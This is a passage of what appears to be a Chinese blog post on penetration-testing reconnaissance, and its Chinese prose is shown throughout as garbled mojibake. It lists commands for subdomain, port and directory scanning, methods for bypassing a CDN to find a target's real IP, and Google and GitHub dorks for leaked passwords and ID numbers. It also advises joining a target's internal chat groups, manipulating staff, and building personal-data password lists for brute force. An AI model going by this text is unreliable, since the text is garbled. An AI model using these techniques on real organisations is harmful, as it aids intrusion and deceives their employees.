href="https://hunter.qianxin.com/">é¹°å›¾å¹³å°</a></p></li></ul><h3 id="ç¬¬ä¸‰æ–¹åœ¨çº¿å¹³å°"><a href="#ç¬¬ä¸‰æ–¹åœ¨çº¿å¹³å°" class="headerlink" title="ç¬¬ä¸‰æ–¹åœ¨çº¿å¹³å°"></a>ç¬¬ä¸‰æ–¹åœ¨çº¿å¹³å°</h3><ul><li><p><a href="https://securitytrails.com(uiå¥½çœ‹,ç»“æœæœ€å¤š)/">https://securitytrails.comï¼ˆUIå¥½çœ‹ï¼Œç»“æœæœ€å¤šï¼‰</a></p></li><li><p><a href="https://dnsdumpster.com/">DNSdumpster.com </a></p></li><li><p><a href="https://rapiddns.io/">https://rapiddns.io/</a></p></li></ul><h3 id="èšåˆå·¥å…·-1"><a href="#èšåˆå·¥å…·-1" class="headerlink" title="èšåˆå·¥å…·"></a>èšåˆå·¥å…·</h3><h4 id="æ”¶é›†å·¥å…·"><a href="#æ”¶é›†å·¥å…·" class="headerlink" title="æ”¶é›†å·¥å…·"></a>æ”¶é›†å·¥å…·</h4><ul><li><p><code>OneForAll</code></p><blockquote><p>ä¸€æ¡é¾™ï¼Œéœ€è¦é…ç½®apiï¼Œé…åˆä»£ç†ä½¿ç”¨æ•ˆæœæ›´ä½³</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python oneforall.py --target domain run</span><br><span class="line">python oneforall.py --targets domain.txt run</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230508203149442-1685533751888.png" alt="image-20230508203149442"></p></li><li><p><code>Amass</code></p><p>æ„Ÿè§‰é€Ÿåº¦æ…¢</p><p>æ‰‹å†Œï¼š<a href="https://github.com/owasp-amass/amass/blob/master/doc/user_guide.md">https://github.com/owasp-amass/amass/blob/master/doc/user_guide.md</a></p><p>domainå¯è§†åŒ–</p><p><img src="/../images/maltego_results-1685533751888.png" alt="Maltego results"></p></li><li><p><code>ksubdomain</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ksubdomain -d seebug.org -full -summary</span><br></pre></td></tr></table></figure></li><li><p><code>subfinder</code> </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">subfinder -silent -d hackerone.com </span><br></pre></td></tr></table></figure></li></ul><h4 id="æ¢æ´»å·¥å…·"><a href="#æ¢æ´»å·¥å…·" class="headerlink" title="æ¢æ´»å·¥å…·"></a>æ¢æ´»å·¥å…·</h4><ul><li><code>httpx</code></li></ul><p>è”åŠ¨</p><ul><li>subfinder é€šè¿‡å„ç§æœç´¢å¼•æ“è·å–åŸŸå</li><li>ksubdomain éªŒè¯åŸŸå</li><li>httpx httpè¯·æ±‚è·å¾—æ•°æ®,éªŒè¯å­˜æ´»</li></ul><p><img src="/../images/image-20230508205053563-1685533751888.png" alt="image-20230508205053563"></p><h2 id="IPæ®µä¿¡æ¯æ”¶é›†"><a href="#IPæ®µä¿¡æ¯æ”¶é›†" class="headerlink" title="IPæ®µä¿¡æ¯æ”¶é›†"></a>IPæ®µä¿¡æ¯æ”¶é›†</h2><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><h4 id="åˆ¤æ–­CDN"><a href="#åˆ¤æ–­CDN" class="headerlink" title="åˆ¤æ–­CDN"></a>åˆ¤æ–­CDN</h4><h5 id="å¤šåœ°ping"><a href="#å¤šåœ°ping" class="headerlink" title="å¤šåœ°ping"></a>å¤šåœ°ping</h5><p>å¦‚æœæ²¡æœ‰ä½¿ç”¨CDNï¼Œåˆ™åªä¼šæ˜¾ç¤ºä¸€ä¸ªIPåœ°å€ã€‚</p><ul><li><a href="http://www.webkaka.com/Ping.aspx">http://www.webkaka.com/Ping.aspx</a>ï¼ˆå›½å†…+å›½å¤–ï¼‰</li><li><a href="https://www.host-tracker.com/v3/check/">https://www.host-tracker.com/v3/check/</a>  ï¼ˆå›½å¤–ï¼‰</li></ul><h5 id="nslookupæ³•"><a href="#nslookupæ³•" class="headerlink" title="nslookupæ³•"></a>nslookupæ³•</h5><ul><li><p>æœåŠ¡å™¨åç§°</p><p><img src="/../images/image-20230509225424444-1685533751888.png" alt="image-20230509225424444"></p></li><li><p>åŒä¸€ä¸ªåŸŸåè§£æå¯¹åº”å¤šä¸ª IP åœ°å€</p><p><img src="/../images/image-20230509225313449-1685533751888.png" alt="image-20230509225313449"></p></li></ul><h5 id="è§‚å¯Ÿheader"><a href="#è§‚å¯Ÿheader" class="headerlink" title="è§‚å¯Ÿheader"></a>è§‚å¯Ÿheader</h5><ul><li>è§‚å¯Ÿè¯·æ±‚å“åº”çš„è¿”å›æ•°æ®çš„å¤´éƒ¨ï¼Œæ˜¯å¦æœ‰ CDN æœåŠ¡å•†æ ‡è¯†</li><li>è‹¥ asp æˆ–è€… asp.net ç½‘ç«™è¿”å›å¤´çš„ server ä¸æ˜¯ IISã€è€Œæ˜¯ Nginxï¼Œåˆ™å¤šåŠä½¿ç”¨äº†nginxåå‘ä»£ç†åˆ° CDN<img src="/../images/image-20210901093608312-1685533751888.png" alt="image-20210901093608312"></li></ul><h5 id="åœ¨çº¿ç½‘ç«™"><a href="#åœ¨çº¿ç½‘ç«™" class="headerlink" title="åœ¨çº¿ç½‘ç«™"></a>åœ¨çº¿ç½‘ç«™</h5><p><a href="https://www.cdnplanet.com/tools/cdnfinder/">https://www.cdnplanet.com/tools/cdnfinder/</a></p><h4 id="ç»•è¿‡CDN"><a href="#ç»•è¿‡CDN" class="headerlink" title="ç»•è¿‡CDN"></a>ç»•è¿‡CDN</h4><p>[BYPASS-CDN&#x2F;CDN 2023 å®Œå…¨æ”»å‡»æŒ‡å—ï¼ˆä¸€ï¼‰.md at main Â· bin-maker&#x2F;BYPASS-CDN Â· GitHub](<a href="https://github.com/bin-maker/BYPASS-CDN/blob/main/CDN">https://github.com/bin-maker/BYPASS-CDN/blob/main/CDN</a> 2023 å®Œå…¨æ”»å‡»æŒ‡å—ï¼ˆä¸€ï¼‰.md)</p><h5 id="CDNè´¹ç”¨"><a href="#CDNè´¹ç”¨" class="headerlink" title="CDNè´¹ç”¨"></a>CDNè´¹ç”¨</h5><p>CDN åŠ é€Ÿéœ€è¦æ”¯ä»˜ä¸€å®šçš„è´¹ç”¨ï¼Œæ‰€ä»¥<strong>å­ç«™ï¼Œå›½å¤–</strong>å¾ˆå¯èƒ½æ²¡æœ‰éƒ¨ç½²CDNã€‚</p><h5 id="å†å²-DNS-è®°å½•"><a href="#å†å²-DNS-è®°å½•" class="headerlink" title="å†å² DNS è®°å½•"></a>å†å² DNS è®°å½•</h5><p><a href="https://viewdns.info/iphistory/?domain=www.baidu.com">IP History - ViewDNS.info</a></p><p><a href="https://x.threatbook.com/v5/domain/www.baidu.com?source=top">å¾®æ­¥åœ¨çº¿Xæƒ…æŠ¥ç¤¾åŒº-å¨èƒæƒ…æŠ¥æŸ¥è¯¢_å¨èƒåˆ†æå¹³å°_å¼€æ”¾ç¤¾åŒº</a></p><h5 id="é‚®ç®±"><a href="#é‚®ç®±" class="headerlink" title="é‚®ç®±"></a>é‚®ç®±</h5><blockquote><p>ç”¨ç›®æ ‡é‚®ä»¶æœåŠ¡å™¨å‘é€é‚®ä»¶ç»™è‡ªå·±(QQé‚®ç®±)å†æŸ¥çœ‹é‚®ä»¶æºç ä¸€å®šæƒ…å†µä¸‹å¯ä»¥æ‰¾åˆ°çœŸå®IPï¼ˆæœåŠ¡ç«¯å’Œæˆ‘ä»¬å»ºç«‹è¿æ¥ï¼‰</p><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ª<code>å¥‡æ·«æŠ€å·§</code>ï¼Œé€šè¿‡å‘é€é‚®ä»¶ç»™ä¸€ä¸ªä¸å­˜åœ¨çš„é‚®ç®±åœ°å€ï¼Œæ¯”å¦‚ <a href="mailto:000xxx@domain.com">000xxx@domain.com</a> ï¼Œå› ä¸ºè¯¥ç”¨æˆ·ä¸å­˜åœ¨ï¼Œæ‰€ä»¥å‘é€å°†å¤±è´¥ï¼Œå¹¶ä¸”è¿˜ä¼šæ”¶åˆ°ä¸€ä¸ªåŒ…å«å‘é€è¯¥ç”µå­é‚®ä»¶ç»™ä½ çš„æœåŠ¡å™¨çš„çœŸå® IP é€šçŸ¥ã€‚</p></blockquote><ul><li>RSS è®¢é˜…</li><li>é‚®ç®±æ³¨å†Œã€æ¿€æ´»å¤„</li><li>é‚®ç®±æ‰¾å›å¯†ç å¤„</li><li>äº§å“æ›´æ–°çš„é‚®ä»¶æ¨é€</li><li>æŸä¸šåŠ¡æ‰§è¡Œåå‘é€çš„é‚®ä»¶é€šçŸ¥</li><li>å‘˜å·¥é‚®ç®±ã€é‚®ä»¶ç®¡ç†å¹³å°ç­‰å…¥å£å¤„çš„å¿˜è®°å¯†ç </li></ul><h5 id="virtual-host-ç¢°æ’"><a href="#virtual-host-ç¢°æ’" class="headerlink" title="virtual-host ç¢°æ’"></a>virtual-host ç¢°æ’</h5><p>åŸç†ï¼š<a href="https://mp.weixin.qq.com/s/o8uAPbw7OSdFhHKOpOYKvg">https://mp.weixin.qq.com/s/o8uAPbw7OSdFhHKOpOYKvg</a></p><ul><li>å½“æˆ‘ä»¬æ”¶é›†äº†ç›®æ ‡è¶³å¤Ÿå¤šçš„å¯èƒ½çš„çœŸå® IP æ—¶ï¼Œå¯ä»¥é€šè¿‡ IP å’Œå­åŸŸçš„ç¢°æ’ï¼Œæ¥æ‰¹é‡è·å¾—å‘½ä¸­ç›®æ ‡ä»¥åŠç›®æ ‡å“ªäº›çš„å­åŸŸã€‚</li><li>åœ¨çº¿æ”¶é›†å·¥å…· <a href="https://pentest-tools.com/information-gathering/find-virtual-hosts">https://pentest-tools.com/information-gathering/find-virtual-hosts</a></li></ul><h5 id="ç©ºé—´æµ‹ç»˜å¼•æ“"><a href="#ç©ºé—´æµ‹ç»˜å¼•æ“" class="headerlink" title="ç©ºé—´æµ‹ç»˜å¼•æ“"></a>ç©ºé—´æµ‹ç»˜å¼•æ“</h5><ul><li><p>favicon.ico å“ˆå¸Œç‰¹å¾</p></li><li><p>ç½‘é¡µæºç ç‰¹å¾å€¼</p><blockquote><p>åœ¨æœåŠ¡å™¨æº IP åœ°å€å…è®¸è®¿é—®å¹¶ä¸”è¿”å›çš„ä¹Ÿæ˜¯ç±»ä¼¼çš„ç½‘ç«™å†…å®¹æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡ä¾¦å¯Ÿé¡µé¢æºç ä¸­ JS ã€CSS ã€HTML ç­‰ä¸€ç³»åˆ—é™æ€ç‰¹å¾å€¼ï¼Œç„¶åç”¨ Shodan ã€Zoomeye ã€Censys ç­‰æœç´¢å¼•æ“è¿›è¡ŒåŒ¹é…æœç´¢ï¼Œä»è€Œå®šä½ IP ã€‚</p></blockquote></li></ul><h4 id="çœŸå®-IP-ä½¿ç”¨"><a href="#çœŸå®-IP-ä½¿ç”¨" class="headerlink" title="çœŸå® IP ä½¿ç”¨"></a>çœŸå® IP ä½¿ç”¨</h4><p>åœ¨è·å–åˆ°çœŸå®IPåï¼Œé€šè¿‡ç›´æ¥è®¿é—®IPå¯èƒ½æ— æ³•è®¿é—®</p><ul><li><p>ä¿®æ”¹ hosts æ–‡ä»¶</p></li><li><p>burpsuite æµ‹è¯•</p><p><img src="/../images/image-20230510181257028-1685533751888.png" alt="image-20230510181257028"></p></li></ul><h3 id="Cæ®µåŠç«¯å£æ‰«æ"><a href="#Cæ®µåŠç«¯å£æ‰«æ" class="headerlink" title="Cæ®µåŠç«¯å£æ‰«æ"></a>Cæ®µåŠç«¯å£æ‰«æ</h3><h4 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">masscan</span><br><span class="line">fscan </span><br><span class="line">fscanç»“æœå¤„ç†ï¼š</span><br><span class="line">https://github.com/ZororoZ/fscanOutput</span><br><span class="line"></span><br><span class="line">TXPortMap</span><br></pre></td></tr></table></figure><h4 id="å¸¸è§ç«¯å£"><a href="#å¸¸è§ç«¯å£" class="headerlink" title="å¸¸è§ç«¯å£"></a>å¸¸è§ç«¯å£</h4><p><a href="http://zhuabapa.top/2020/06/03/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">â€˜å¸¸ç”¨ç«¯å£åˆ©ç”¨æ€»ç»“â€™ | zer0_c|imbâ€™s blog</a></p><h1 id="æ•æ„Ÿä¿¡æ¯æ”¶é›†"><a href="#æ•æ„Ÿä¿¡æ¯æ”¶é›†" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ”¶é›†"></a>æ•æ„Ÿä¿¡æ¯æ”¶é›†</h1><h2 id="ä¸ºä»€ä¹ˆ-1"><a href="#ä¸ºä»€ä¹ˆ-1" class="headerlink" title="ä¸ºä»€ä¹ˆ"></a>ä¸ºä»€ä¹ˆ</h2><ul><li><p>è¿æ°”å¥½ï¼Œä¸€æ­¥åˆ°ä½</p></li><li><p>åˆ¶ä½œæœ‰é’ˆå¯¹æ€§çš„å¼±å£ä»¤å­—å…¸</p></li><li><p>ğŸ£</p></li></ul><h2 id="æœç´¢å¼•æ“-1"><a href="#æœç´¢å¼•æ“-1" class="headerlink" title="æœç´¢å¼•æ“"></a>æœç´¢å¼•æ“</h2><ul><li><p>é’ˆå¯¹ä¿¡æ¯æ³„éœ²çš„åœ¨çº¿ç½‘ç«™</p><ul><li><p><a href="https://leakix.net/">LeakIX</a></p></li><li><p><a href="https://intelx.io/">https://intelx.io/</a></p></li><li><p><a href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a></p></li><li><p><a href="https://aleph.occrp.org/">https://aleph.occrp.org/</a></p></li><li><p><a href="https://dehashed.com/">https://dehashed.com/</a></p></li></ul></li><li><p><code>Google Hacking</code></p><ul><li><p>å¸¸ç”¨è¯­æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com  è´¦å· | å¯†ç  | å·¥å· | å­¦å· | èº«ä»½è¯ | å…¬ç¤º | é‚®ç®±</span><br></pre></td></tr></table></figure></li><li><p>å·¥å…·</p><p><a href="https://github.com/dwisiswant0/go-dork">https://github.com/dwisiswant0/go-dork</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.\go-dork.exe -q &quot;[è¯­æ³•]&quot; -p [é¡µé¢æ•°é‡] -x http://127.0.0.1:33210 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä¸€é¡µ10ä¸ªæ•°æ®</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-e æŒ‡å®šå¼•æ“ æµ‹è¯•äº†åªæœ‰googleå¯ä»¥</span><br><span class="line">Google, Shodan, Bing, Duck, Yahoo, Ask</span><br></pre></td></tr></table></figure><p>â€‹<img src="/../images/image-20230510222146978-1685533751888.png" alt="image-20230510222146978"></p></li></ul></li></ul><p>â€‹</p><ul><li><p>ç½‘ç«™</p><p><a href="https://ght.se7ensec.cn/#">åœ¨çº¿Google Hackingå°å·¥å…·</a></p><p><img src="/../images/image-20230509215656848-1685533751889.png" alt="image-20230509215656848"></p><p><a href="https://www.exploit-db.com/google-hacking-database">Google Hacking Database (GHDB) - Google Dorks, OSINT, Recon</a></p><p><img src="/../images/image-20230509151606375-1685533751889.png" alt="image-20230509151606375"></p></li></ul><h2 id="ç›®å½•-x2F-æ–‡ä»¶æ‰«æ"><a href="#ç›®å½•-x2F-æ–‡ä»¶æ‰«æ" class="headerlink" title="ç›®å½•&#x2F;æ–‡ä»¶æ‰«æ"></a>ç›®å½•&#x2F;æ–‡ä»¶æ‰«æ</h2><p><strong>å–å†³äºå­—å…¸ï¼Œéœ€è¦ç§¯ç´¯å­—å…¸</strong></p><ul><li><p>å·¥å…·</p><ul><li><p><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffuf -c -w /path/to/wordlist -u https://target/FUZZ</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨éœ€è¦æµ‹è¯•çš„åœ°æ–¹åŠ ä¸ŠFUZZ</p></blockquote></li><li><p><a href="https://github.com/lemonlove7/dirsearch_bypass403">https://github.com/lemonlove7/dirsearch_bypass403</a></p><blockquote><p>æµç¨‹ï¼šdirsearchè¿›è¡Œç›®å½•æ‰«æâ€”&gt;å°†æ‰€æœ‰403çŠ¶æ€çš„ç›®å½•è¿›è¡Œä¿å­˜â€“&gt;æ˜¯å¦è¿›è¡Œjsfindâ€“&gt;æ˜¯(è¿›è¡Œjsçˆ¬å–urlå’ŒåŸŸåï¼Œå°†çˆ¬å–åˆ°çš„urlè¿›è¡ŒçŠ¶æ€ç è¯†åˆ«å¦‚æœæ˜¯403çŠ¶æ€åˆ™è¿›è¡Œä¿å­˜)â€“&gt;è¿›è¡Œ403ç»•è¿‡ ï¼ˆä¸è¿‡jsfinderä¸å»ºè®®ä½¿ç”¨ï¼Œä¸å¦‚urlfinderå¥½ç”¨ï¼‰</p></blockquote></li><li><p><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a></p><blockquote><p><strong>BBScan</strong> æ˜¯ä¸€ä¸ªé«˜å¹¶å‘ã€è½»é‡çº§çš„ä¿¡æ¯æ³„éœ²æ‰«æå·¥å…·ã€‚</p></blockquote></li><li><p><a href="https://blog.csdn.net/qq_43427482/article/details/110008286">https://blog.csdn.net/qq_43427482/article/details/110008286</a></p><blockquote><p>æ•æ„Ÿæ–‡ä»¶</p></blockquote></li></ul></li><li><p>å­—å…¸</p><p>å°†å·¥å…·å†…ç½®å­—å…¸å’Œå…¬å¼€å­—å…¸è¿›è¡Œæ•´åˆï¼Œç„¶åè‡ªå·±åœ¨å®é™…ä¸­é‡åˆ°çš„å†æ·»åŠ ã€‚</p></li></ul><h2 id="JSä¿¡æ¯"><a href="#JSä¿¡æ¯" class="headerlink" title="JSä¿¡æ¯"></a>JSä¿¡æ¯</h2><p>å¯èƒ½æ³„éœ²æ¥å£ï¼Œåå°åœ°å€ï¼Œå¯†ç ç­‰æ•æ„Ÿä¿¡æ¯</p><h3 id="æŸ¥æ‰¾"><a href="#æŸ¥æ‰¾" class="headerlink" title="æŸ¥æ‰¾"></a>æŸ¥æ‰¾</h3><ul><li><p>å·¥å…·</p><p><code>Urlfinder</code>  ï¼ˆæ¨èï¼‰</p><p><code>JSfinder</code></p><p><a href="https://github.com/mickeystone/JSFinderPlus">https://github.com/mickeystone/JSFinderPlus</a></p></li><li><p>æµè§ˆå™¨æ’ä»¶</p><p>ç†ŠçŒ«å¤´â€“<code>FindSomething</code></p></li></ul><h3 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h3><p><a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p><h2 id="ä»£ç æ‰˜ç®¡å¹³å°"><a href="#ä»£ç æ‰˜ç®¡å¹³å°" class="headerlink" title="ä»£ç æ‰˜ç®¡å¹³å°"></a>ä»£ç æ‰˜ç®¡å¹³å°</h2><ul><li><p>github</p><p>å·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/damit5/gitdorks_go</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./gitdorks_go_amd_linux -gd ../Dorks/smalldorks.txt -nws 20 -target gm7.org -tf ../tokenFile/tf.txt -ew 3</span><br></pre></td></tr></table></figure><blockquote><p><code>./tokenFile/tf.txt</code> â†’ <code>Github access token</code></p><p><code>../Dorks/smalldorks.txt</code> â†’  <code>å…³é”®å­—å­—å…¸</code></p></blockquote></li><li><p>GitLab: <a href="https://about.gitlab.com/">https://about.gitlab.com/</a></p></li><li><p>gitee: <a href="https://gitee.com/">https://gitee.com/</a></p></li></ul><h2 id="ç½‘ç›˜ä¿¡æ¯"><a href="#ç½‘ç›˜ä¿¡æ¯" class="headerlink" title="ç½‘ç›˜ä¿¡æ¯"></a>ç½‘ç›˜ä¿¡æ¯</h2><p>èšåˆç½‘ç«™ï¼š<a href="https://www.chaonengsou.com/">è¶…èƒ½æœ - ç™¾åº¦ç½‘ç›˜æœç´¢ç¥å™¨</a></p><h2 id="å†å²æ¼æ´"><a href="#å†å²æ¼æ´" class="headerlink" title="å†å²æ¼æ´"></a>å†å²æ¼æ´</h2><blockquote><p>ä»å„ç¬¬ä¸‰æ–¹å†å²æ¼æ´åº“ä¸­æŸ¥æ‰¾ç›®æ ‡æ›¾ç»æ³„éœ²çš„ å„ç§æ•æ„Ÿè´¦å·å¯†ç  [ å›½å†…ç›®æ ‡å¾ˆå¥½ä½¿ ]</p></blockquote><h2 id="æŠ€æœ¯æ–‡æ¡£-x2F-wiki-x2F-çŸ¥è¯†åº“"><a href="#æŠ€æœ¯æ–‡æ¡£-x2F-wiki-x2F-çŸ¥è¯†åº“" class="headerlink" title="æŠ€æœ¯æ–‡æ¡£ &#x2F; wiki &#x2F;çŸ¥è¯†åº“"></a>æŠ€æœ¯æ–‡æ¡£ &#x2F; wiki &#x2F;çŸ¥è¯†åº“</h2><p>ç›®æ ‡è‡ªå·±å¯¹å¤–æä¾›çš„å„ç§æ–‡æ¡£é‡Œæ³„éœ²çš„å„ç§è´¦å·å¯†ç åŠå…¶å®ƒæ•æ„Ÿä¿¡æ¯</p><ul><li><p>å®˜ç½‘</p></li><li><p><a href="https://www.yuque.com/dashboard">å·¥ä½œå° Â· è¯­é›€</a></p></li><li><p>ç™¾åº¦æ–‡åº“ï¼š<a href="https://wenku.baidu.com/">https://wenku.baidu.com</a></p><p>åŸåˆ›åŠ›æ–‡æ¡£ï¼š<a href="https://max.book118.com/">https://max.book118.com</a></p><p>å‡Œé£äº‘ï¼š<a href="https://wenku.lingfengyun.com/">https://wenku.lingfengyun.com</a></p></li></ul><h2 id="ç¤¾å·¥"><a href="#ç¤¾å·¥" class="headerlink" title="ç¤¾å·¥"></a>ç¤¾å·¥</h2><h3 id="æ‰“å…¥ç›®æ ‡å†…éƒ¨"><a href="#æ‰“å…¥ç›®æ ‡å†…éƒ¨" class="headerlink" title="æ‰“å…¥ç›®æ ‡å†…éƒ¨"></a>æ‰“å…¥ç›®æ ‡å†…éƒ¨</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŠ å…¥å†…éƒ¨QQç¾¤ / å¾®ä¿¡ç¾¤ / é’‰é’‰ç¾¤ ç­‰</span><br><span class="line">ç¤¾å·¥å†…éƒ¨äººå‘˜</span><br></pre></td></tr></table></figure><h3 id="ä¸ªäººä¿¡æ¯ä½¿ç”¨"><a href="#ä¸ªäººä¿¡æ¯ä½¿ç”¨" class="headerlink" title="ä¸ªäººä¿¡æ¯ä½¿ç”¨"></a>ä¸ªäººä¿¡æ¯ä½¿ç”¨</h3><ul><li><p>å°†å‰é¢æ”¶é›†åˆ°çš„å§“åï¼Œé‚®ç®±ï¼Œæ‰‹æœºå·ç­‰ä¸ªäººä¿¡æ¯æ”¾å…¥ç¤¾å·¥åº“æŸ¥è¯¢</p></li><li><p><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p><blockquote><p>é€šè¿‡æœç´¢å¼•æ“ã€PGPæœåŠ¡å™¨ä»¥åŠSHODANæ•°æ®åº“æ”¶é›†ç”¨æˆ·çš„emailï¼Œå­åŸŸåï¼Œä¸»æœºï¼Œé›‡å‘˜åï¼Œå¼€æ”¾ç«¯å£å’Œbannerä¿¡æ¯ã€‚</p></blockquote></li><li><p>ç”Ÿæˆç¤¾å·¥å­—å…¸ï¼Œè¿›è¡Œå£ä»¤çˆ†ç ´</p><p><a href="https://github.com/zgjx6/SocialEngineeringDictionaryGenerator">https://github.com/zgjx6/SocialEngineeringDictionaryGenerator</a></p></li></ul><h1 id="æŒ‡çº¹è¯†åˆ«"><a href="#æŒ‡çº¹è¯†åˆ«" class="headerlink" title="æŒ‡çº¹è¯†åˆ«"></a>æŒ‡çº¹è¯†åˆ«</h1><h2 id="ä¸ºä»€ä¹ˆ-2"><a href="#ä¸ºä»€ä¹ˆ-2" class="headerlink" title="ä¸ºä»€ä¹ˆ"></a>ä¸ºä»€ä¹ˆ</h2><ul><li><p><strong>ç­›é€‰å‡ºæœ€å¯èƒ½æœ‰æ¼æ´çš„ç‚¹</strong></p></li><li><p><strong>è¯†åˆ«waf</strong></p></li></ul><h2 id="æŒ‡çº¹è¯†åˆ«-1"><a href="#æŒ‡çº¹è¯†åˆ«-1" class="headerlink" title="æŒ‡çº¹è¯†åˆ«"></a>æŒ‡çº¹è¯†åˆ«</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><h3 id="Webåº”ç”¨æ¡†æ¶"><a href="#Webåº”ç”¨æ¡†æ¶" class="headerlink" title="Webåº”ç”¨æ¡†æ¶"></a>Webåº”ç”¨æ¡†æ¶</h3><h4 id="å·¥å…·-1"><a href="#å·¥å…·-1" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><ul><li><p><a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></p><p><img src="/../images/image-20230511175807888-1685533751889.png" alt="image-20230511175807888"></p></li><li><p><a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a> </p><p><img src="/../images/image-20230510175457574-1685533751889.png" alt="image-20230510175457574"></p></li><li><p><a href="https://github.com/broken5/bscan">https://github.com/broken5/bscan</a></p><p><img src="/../images/image-20230510175516456-1685533751889.png" alt="image-20230510175516456"></p></li><li><p><a href="https://github.com/EASY233/Finger">https://github.com/EASY233/Finger</a></p><p><img src="/../images/image-20230510175534390-1685533751889.png" alt="image-20230510175534390"></p></li><li><p><a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></p><p><img src="/../images/image-20230511110926338-1685533751889.png" alt="image-20230511110926338"></p></li></ul><h4 id="åœ¨çº¿ç½‘ç«™-1"><a href="#åœ¨çº¿ç½‘ç«™-1" class="headerlink" title="åœ¨çº¿ç½‘ç«™"></a>åœ¨çº¿ç½‘ç«™</h4><ul><li><p><a href="https://fp.shuziguanxing.com/#/">æŒ‡çº¹æ”¶å½•å¹³å°</a></p></li><li><p><a href="https://hackertarget.com/whatweb-scan/">https://hackertarget.com/whatweb-scan/</a></p></li><li><p><a href="http://www.yunsee.cn/">äº‘æ‚‰äº’è”ç½‘WEBèµ„äº§åœ¨çº¿æ¢³ç†|åœ¨çº¿CMSæŒ‡çº¹è¯†åˆ«å¹³å° - äº‘æ‚‰å®‰å…¨å¹³å°</a>ï¼ˆè¦ä¼ä¸šæ³¨å†Œï¼‰</p></li></ul><h4 id="æµè§ˆå™¨æ’ä»¶"><a href="#æµè§ˆå™¨æ’ä»¶" class="headerlink" title="æµè§ˆå™¨æ’ä»¶"></a>æµè§ˆå™¨æ’ä»¶</h4><p>Wappalyzer</p><h3 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h3><ul><li><p>æŸ¥çœ‹è¿”å›åŒ…æœ‰æ— WAFå­—æ ·</p><p><img src="/../images/image-20230511233014884-1685533751889.png" alt="image-20230511233014884"></p></li><li><p><a href="https://github.com/EnableSecurity/wafw00f">WAFW00F </a></p></li><li><p>æŸ¥çœ‹æ‹¦æˆªé¡µé¢ä¿¡æ¯</p><blockquote><p>é€šè¿‡ä¸€äº›æ˜æ˜¾çš„æ³¨å…¥æ¥è§¦å‘waf</p></blockquote><p><a href="https://cloud.tencent.com/developer/beta/article/1872310">83ä¸ªWafæ‹¦æˆªé¡µé¢-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a>  ï¼ˆ5å¹´å‰ï¼‰</p><p><a href="https://mp.weixin.qq.com/s/8F060FU9g_78z57UKS-JsQ">30å‡ æ¬¾å¸¸è§WAFçš„æ‹¦æˆªé¡µæ•´ç†</a>   ï¼ˆ2021å¹´ï¼‰</p></li></ul><h3 id="èœœç½"><a href="#èœœç½" class="headerlink" title="èœœç½"></a>èœœç½</h3><h1 id="æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨"><a href="#æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨" class="headerlink" title="æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨"></a>æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨</h1><h2 id="åŸºæœ¬æµç¨‹"><a href="#åŸºæœ¬æµç¨‹" class="headerlink" title="åŸºæœ¬æµç¨‹"></a>åŸºæœ¬æµç¨‹</h2><p>ç»è¿‡ä¿¡æ¯æ”¶é›†å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webæœåŠ¡ ï¼ˆæ¶æ„ï¼Œä¸­é—´ä»¶ï¼Œç›®å½•ç»“æ„ï¼‰</span><br><span class="line">ç«¯å£æœåŠ¡</span><br><span class="line">æ•æ„Ÿä¿¡æ¯ ï¼ˆæ•æ„Ÿæ–‡ä»¶ï¼Œç¤¾å·¥ä¿¡æ¯ï¼‰</span><br><span class="line">é‡ç‚¹æ”»å‡»å¯¹è±¡</span><br><span class="line">ç«™ç‚¹æ˜¯å¦å­˜åœ¨waf</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ¼æ‰«</span><br><span class="line">æ‰‹å·¥</span><br><span class="line">ç»•waf</span><br><span class="line">ä»£ç å®¡è®¡</span><br></pre></td></tr></table></figure><h2 